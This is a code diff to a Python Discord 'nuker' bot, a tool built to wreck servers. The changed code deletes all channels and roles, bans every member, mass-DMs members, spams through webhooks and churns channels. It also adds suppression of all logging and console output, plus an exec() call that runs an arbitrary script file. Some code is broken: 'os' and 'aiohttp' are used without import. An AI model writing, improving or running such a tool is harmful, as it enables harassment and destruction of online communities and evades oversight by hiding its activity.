@@ -1,7 +1,23 @@
 import discord
 from discord.ext import commands
+import logging
 import asyncio
 import random
+import sys
+
+# Suppress all logs by setting the logging level to CRITICAL
+logging.basicConfig(level=logging.CRITICAL)
+
+# Suppress discord.py logs
+logger = logging.getLogger('discord')
+logger.setLevel(logging.CRITICAL)
+
+# Suppress asyncio logs
+logging.getLogger('asyncio').setLevel(logging.CRITICAL)
+
+# Suppress all output to stdout and stderr
+sys.stdout = open(os.devnull, 'w')
+sys.stderr = open(os.devnull, 'w')
 
 intents = discord.Intents.default()
 intents.members = True
@@ -213,29 +229,32 @@ async def dm_all_members(guild):
     await menu()
 
 async def create_and_delete_channels(guild):
-    channel_name = input("Enter base name for channels: ")
+    channel_name = input("Enter name for channels: ")
     try:
-        repeat_count = int(input("How many times to repeat create/delete: "))
+        channel_count = int(input("How many channels to create and delete: "))
     except ValueError:
-        print("\033[91mInvalid number of repetitions. Please enter a valid integer.\033[0m")
+        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
         await create_and_delete_channels(guild)
         return
 
-    for _ in range(repeat_count):
-        print(f"\033[92m[ Creating and deleting channels (iteration {_ + 1})... ]\033[0m")
-        new_channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
-        await new_channel.delete()
-    print("Completed creating and deleting channels.")
+    print(f"\033[92m[ Creating and deleting {channel_count} channels... ]\033[0m")
+    for _ in range(channel_count):
+        channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
+        await channel.delete()
+    print(f"Created and deleted {channel_count} channels.")
     await menu()
 
 async def rename_server(guild):
     new_name = input("Enter new server name: ")
-    await guild.edit(name=new_name)
-    print(f"Server renamed to {new_name}")
+    try:
+        await guild.edit(name=new_name)
+        print(f"Server renamed to {new_name}")
+    except discord.errors.Forbidden:
+        print("Cannot rename server.")
     await menu()
 
 async def mass_create_threads(guild):
-    thread_name = input("Enter base name for threads: ")
+    thread_name = input("Enter name for threads: ")
     try:
         thread_count = int(input("How many threads to create per channel: "))
     except ValueError:
@@ -246,13 +265,16 @@ async def mass_create_threads(guild):
     print(f"\033[92m[ Creating {thread_count} threads in each channel... ]\033[0m")
     for channel in guild.text_channels:
         for _ in range(thread_count):
-            await channel.create_text_channel(f"{thread_name}-{random.randint(1000, 9999)}")
-    print("Created threads in channels.")
+            try:
+                await channel.create_thread(name=f"{thread_name}-{random.randint(1000, 9999)}")
+                print(f"Created thread in {channel.name}")
+            except discord.errors.Forbidden:
+                print(f"Cannot create thread in {channel.name}")
     await menu()
 
 async def webhook_spammer(guild):
-    webhook_url = input("Enter the webhook URL: ")
-    message = input("Enter the message to send: ")
+    webhook_url = input("Enter webhook URL: ")
+    message = input("Enter message to send: ")
     try:
         message_count = int(input("How many messages to send: "))
     except ValueError:
@@ -260,15 +282,18 @@ async def webhook_spammer(guild):
         await webhook_spammer(guild)
         return
 
-    print(f"\033[92m[ Sending {message_count} messages via webhook... ]\033[0m")
-    webhook = discord.Webhook.from_url(webhook_url, adapter=discord.RequestsWebhookAdapter())
+    print(f"\033[92m[ Sending {message_count} messages to webhook... ]\033[0m")
     for _ in range(message_count):
-        webhook.send(message)
-        print("Message sent via webhook.")
+        async with aiohttp.ClientSession() as session:
+            async with session.post(webhook_url, json={'content': message}) as response:
+                if response.status == 204:
+                    print("Message sent to webhook.")
+                else:
+                    print(f"Failed to send message. Status code: {response.status}")
     await menu()
 
 async def delete_webhook(guild):
-    webhook_id = input("Enter the ID of the webhook to delete: ")
+    webhook_id = input("Enter webhook ID to delete: ")
     try:
         webhook = await guild.fetch_webhook(webhook_id)
         await webhook.delete()
@@ -282,14 +307,20 @@ async def delete_all_webhooks(guild):
     for channel in guild.text_channels:
         webhooks = await channel.webhooks()
         for webhook in webhooks:
-            await webhook.delete()
-            print(f"Deleted webhook: {webhook.name}")
+            try:
+                await webhook.delete()
+                print(f"Deleted webhook: {webhook.name}")
+            except discord.errors.NotFound:
+                print(f"Webhook not found: {webhook.name}")
     await menu()
 
 async def server_info(guild):
-    print(f"Server name: {guild.name}")
-    print(f"Total members: {guild.member_count}")
-    print(f"Total channels: {len(guild.channels)}")
+    print("\033[92m[ Server Info ]\033[0m")
+    print(f"Name: {guild.name}")
+    print(f"ID: {guild.id}")
+    print(f"Member Count: {guild.member_count}")
+    print(f"Region: {guild.region}")
+    print(f"Created At: {guild.created_at}")
     await menu()
 
 async def rename_all_members(guild):
@@ -305,101 +336,43 @@ async def rename_all_members(guild):
     await menu()
 
 async def custom_script(guild):
-    print("Executing custom script...")
-    # Add your custom script logic here
+    script = input("Enter the path to the Python script to execute: ")
+    try:
+        exec(open(script).read())
+        print(f"Executed script {script}")
+    except Exception as e:
+        print(f"Error executing script: {str(e)}")
     await menu()
 
 async def nuke_server(guild):
-    # Collect inputs
-    delete_channels = input("Delete all channels? (Y/N): ").strip().upper()
-    create_channels = input("Create massive channels? (Y/N): ").strip().upper()
-    if create_channels == 'Y':
+    print("\033[92m[ Nuking server... ]\033[0m")
+    for channel in guild.channels:
         try:
-            channel_count = int(input("How many channels to create: "))
-            channel_name = input("Enter base name for channels: ")
-        except ValueError:
-            print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
-            await nuke_server(guild)  # Restart nuke process
-            return
-    send_spam = input("Send spam messages to all channels? (Y/N): ").strip().upper()
-    if send_spam == 'Y':
-        try:
-            message = input("Enter text to send: ")
-            max_spam_count = int(input("How many steps to spam (e.g., 1, 2, 3, ...): "))
-        except ValueError:
-            print("\033[91mInvalid number of steps. Please enter a valid integer.\033[0m")
-            await nuke_server(guild)  # Restart nuke process
-            return
-    rename_server = input("Rename server? (Y/N): ").strip().upper()
-    if rename_server == 'Y':
-        new_name = input("Enter new server name: ")
-    rename_members = input("Rename all members? (Y/N): ").strip().upper()
-    if rename_members == 'Y':
-        new_name_for_members = input("Enter new name for all members: ")
-    dm_members = input("DM all members? (Y/N): ").strip().upper()
-    if dm_members == 'Y':
-        message_for_dm = input("Enter message to send to all members: ")
-        try:
-            message_count_for_dm = int(input("How many messages to send: "))
-        except ValueError:
-            print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
-            await nuke_server(guild)  # Restart nuke process
-            return
+            await channel.delete()
+            print(f"Deleted channel: {channel.name}")
+        except discord.errors.Forbidden:
+            print(f"Cannot delete channel: {channel.name}")
 
-    # Execute actions
-    if delete_channels == 'Y':
-        print("\033[92m[ Deleting all channels... ]\033[0m")
-        for channel in guild.channels:
+    for role in guild.roles:
+        if role.name != "@everyone":
             try:
-                await channel.delete()
-                print(f"Deleted channel: {channel.name}")
-            except discord.errors.HTTPException as e:
-                print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
-    
-    if create_channels == 'Y':
-        print(f"\033[92m[ Creating {channel_count} channels... ]\033[0m")
-        for _ in range(channel_count):
-            await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
-        print(f"Created {channel_count} channels.")
-    
-    if send_spam == 'Y':
-        print(f"\033[92m[ Spamming channels with increasing message counts... ]\033[0m")
-        for step in range(1, max_spam_count + 1):
-            print(f"\033[92m[ Spamming with {step} messages per channel ]\033[0m")
-            tasks = []
-            for channel in guild.text_channels:
-                for _ in range(step):
-                    tasks.append(channel.send(message))
-            await asyncio.gather(*tasks)
-            await asyncio.sleep(0.5)  # Wait for 0.5 seconds before sending more messages
-    
-    if rename_server == 'Y':
-        await guild.edit(name=new_name)
-        print(f"Server renamed to {new_name}")
-    
-    if rename_members == 'Y':
-        print(f"\033[92m[ Renaming all members to {new_name_for_members}... ]\033[0m")
-        for member in guild.members:
-            if member != bot.user:
-                try:
-                    await member.edit(nick=new_name_for_members)
-                    print(f"Renamed {member.name} to {new_name_for_members}")
-                except discord.errors.Forbidden:
-                    print(f"Cannot rename {member.name}")
-    
-    if dm_members == 'Y':
-        print(f"\033[92m[ DMing all members... ]\033[0m")
-        for member in guild.members:
-            if member != bot.user:
-                try:
-                    for _ in range(message_count_for_dm):
-                        await member.send(message_for_dm)
-                        print(f"Sent message to {member.name}")
-                except discord.errors.Forbidden:
-                    print(f"Cannot send message to {member.name}")
+                await role.delete()
+                print(f"Deleted role: {role.name}")
+            except discord.errors.Forbidden:
+                print(f"Cannot delete role: {role.name}")
 
-    print("\033[92m[ Nuke complete! ]\033[0m")
+    for member in guild.members:
+        if member != bot.user:
+            try:
+                await member.ban(reason='Server nuked by bot')
+                print(f"Banned {member.name}")
+            except discord.errors.Forbidden:
+                print(f"Cannot ban {member.name}")
+
+    print("\033[92mServer nuked successfully.\033[0m")
     await menu()
 
-bot_token, server_id = get_bot_token_and_server_id()
-bot.run(bot_token)
+if __name__ == '__main__':
+    print_title()
+    bot_token, server_id = get_bot_token_and_server_id()
+    bot.run(bot_token)
